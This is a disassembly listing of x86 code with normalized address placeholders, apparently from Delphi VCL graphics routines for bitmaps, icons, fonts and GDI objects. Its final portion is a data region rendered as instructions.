mov eax edi
call sub_426910
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427b94
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_426ef4
mov eax ebx
call sub_426f04
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_425ea8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427c2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4271c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_425da0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4207c4
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_427c30
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403eb4
call sub_403f08
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_425da0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427c68
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_426f04
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_426910
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_427cb8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_426f04
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_426910
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427d14
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402fc4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_426e80
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
call sub_418914
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_423724
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
call sub_418914
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_418b44
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_418b44
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402fc4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_426d44
mov dl [ r-xdata ]
call sub_4225bc
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_4228e0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_425e5c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_418b44
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_418b44
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_418b44
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_418b44
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_418b44
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_418b44
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_422d50
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_418b44
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_423074
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_427fd4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_426f04
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_425ea8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42804e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42650c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428074
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4280bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423a60
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_425cd4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_428110
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_425cd8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_428140
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_428418
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_425cd4
mov eax [ esi + 0x28 ]
call sub_425cd8
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416a84
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4281a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_4225bc
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4281f8
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_428234
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_418900
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_418b0c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_423320
jmp r-xdata
jmp r-xdata
call sub_4227cc
sub_4282ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428339
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4281f8
cmp eax [ rw-data ]
jne r-xdata
call sub_4227cc
mov eax esi
call sub_4281f8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_423864
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402fc4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_418b44
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428360
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4283ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_418914
push eax
mov eax esi
call sub_4188e0
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_418914
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_418b0c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_418b0c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_428418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4227cc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4283f4
mov eax [ ebp - 0x4 ]
call sub_4036c0
call sub_403eb4
call sub_403f08
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428458
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_425cd4
mov eax [ ebx + 0x28 ]
call sub_425cd8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4284d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4282ac
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418914
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_418b44
pop esi
pop ebx
retn
sub_42852c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42856d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_42451c
mov ecx esi
mov edx ebx
call sub_424180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428574
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_42857c
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_422e20
mov [ rw-data ] eax
pop ebx
retn
sub_4285b4
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_4285f8
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4285b4
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4286c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4286fc
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_4288f4
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_428740
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_428728
xor eax eax
push ebp
push sub_4287e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4287e8
mov eax [ ebp - 0x4 ]
call sub_428734
retn
mov eax 0x10
call sub_402744
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4287f4
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4287f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4288d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_426d44
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_421dfc
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_421ce0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_414b64
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_422084
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4224a0
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_426a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4288f4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_428728
xor eax eax
push ebp
push sub_42893f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428946
mov eax [ ebp - 0x4 ]
call sub_428734
retn
mov esp ebp
pop ebp
retn
sub_428946
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402764
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4036c0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_428728
xor eax eax
push ebp
push sub_42893f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428946
mov eax [ ebp - 0x4 ]
call sub_428734
retn
mov esp ebp
pop ebp
retn
sub_42896c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_421054
push eax
mov eax ebx
call sub_421054
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_428740
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4289a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428a6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a74
retn
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
call sub_4259b8
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404f0c
mov eax rw-data
mov ecx 0x31
mov edx [ r-xdata ]
call sub_404f0c
sub_428a78
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42857c
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_4285f8
mov cx 0x2c
mov dl 0x1
mov eax [ sub_4207d8 ]
call sub_42084c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4207d8 ]
call sub_42084c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4207d8 ]
call sub_42084c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4286c4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166dc
mov [ rw-data ] eax
mov ecx sub_421064
mov edx sub_421074
mov eax [ sub_41f844 ]
call sub_41595c
mov ecx r-xdata
mov edx sub_42127c
mov eax [ r-xdata ]
call sub_41595c
sub_428b84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428ba9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bb0
retn
sub_428bc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx + eax * 2 + 0x1400 ] cl
add [ eax + 0x39 ] dh
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] ah
inc ecx
add al cl
popad
inc ecx
add [ ebp + ecx * 4 + 0x42 ] al
add [ eax + 0x60 ] bh
inc ecx
add ah dh
pushad
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x8c
inc edx
add [ eax ] cl
add [ eax ] al
add [ esp + ecx * 4 ] ah
inc edx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah cl
lea eax [ edx ]
xor [ esi - 0x71efffbe ] cl
inc edx
add ah bh
lea eax [ edx ]
push es
jo r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
mov eax eax
sub [ rw-data ] 0x1
retn
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x42 ] bh
add [ eax ] cl
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah cl
lea eax [ edx ]
call 0x1042cc9f
mov es [ edx ]
cld
lea eax [ edx ]
or al 0x54
dec edi
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41640c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
mov eax edi
call sub_4036c0
dec esp
imul esi [ ebx + 0x74 ] 0xd800408d
mov [ edx ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_428cec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_428d44
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41640c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4036c0
sub_428d88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_428dcc
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4036c0
mov edx ebx
